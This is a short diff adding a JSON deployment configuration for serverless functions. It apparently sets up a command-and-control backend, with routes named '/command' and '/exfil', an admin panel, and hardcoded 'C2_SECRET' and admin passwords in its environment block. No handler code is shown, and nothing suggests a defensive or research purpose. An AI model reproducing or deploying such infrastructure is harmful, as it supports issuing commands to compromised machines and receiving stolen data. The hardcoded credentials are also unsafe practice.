@@ -1,0 +1,17 @@
+{
+  "functions": {
+    "api/*.js": {
+      "maxDuration": 10
+    }
+  },
+  "rewrites": [
+    { "source": "/", "destination": "/api/admin.js" },
+    { "source": "/command", "destination": "/api/command.js" },
+    { "source": "/exfil", "destination": "/api/exfil.js" },
+    { "source": "/admin", "destination": "/api/admin.js" }
+  ],
+  "env": {
+    "C2_SECRET": "franx@2024",
+    "ADMIN_PASS": "franx123"
+  }
+}
